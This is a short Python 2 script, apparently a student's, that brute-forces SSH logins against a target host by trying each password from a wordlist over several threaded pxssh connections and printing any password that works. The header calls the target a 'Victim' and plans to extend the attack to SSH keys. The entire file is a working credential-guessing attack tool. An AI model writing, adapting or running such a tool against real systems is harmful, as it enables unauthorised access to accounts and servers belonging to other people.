#A script to brute force SSH access
#Author : Ed Fish -- efish001@gold.ac.uk
#Use: -H host -u user -f password list
#Bugs: Victim receives warning message and keyboard grab
#To do: swap password file to test 1028b ssh keys

import pxssh              #for ssh
import optparse           #for parsing commands from shell
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)  #ensure only we can close connection
Found = False                                             #found password
Fails = 0                                                 #limit fails during thread

#Try to connect through ssh using the pxssh library

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()                        #init pxssh
        s.login(host, user, password)            #-h -u -f
        print '[+] Password Found: ' + password  #if successfull
        Found = True

    except Exception, e:

        if 'read_nonblocking' in str(e):         #check exceptions
            Fails+= 1                            #keep track of fails
            time.sleep(5)                        #space out requests
            connect(host, user, password, False) #try again
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()    #close connection


def main():
    #opt parse add options for command line use
    parser = optparse.OptionParser('usage%prog '+ '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string',help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()

    host = options.tgtHost             #get host from command line

    passwdFile = options.passwdFile    #get password file from command line

    user = options.user                #get user from command line

    #if details are wrong
    if host == None or passwdFile == None or user == None:
        print parser.usage
        print '[+] no connection'
        exit(0)

    #Reading password file
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:                                     #check found bool
            print "[*] Exiting: Password Found"
            exit(0)
            if Fails > 5:                             #dont overload it
                print "[!] Exiting: Too many socket timeouts"
                exit(0)

        connection_lock.acquire()                    #bound semaphore lock
        password= line.strip('\r').strip('\n')       #get password
        print "[-] Testing:"+str(password)
        t = Thread(target=connect, args=(host, user, password, True))  #test password with thread
        child = t.start()                            #start cracking

#initiate
if __name__ == '__main__':
    main()
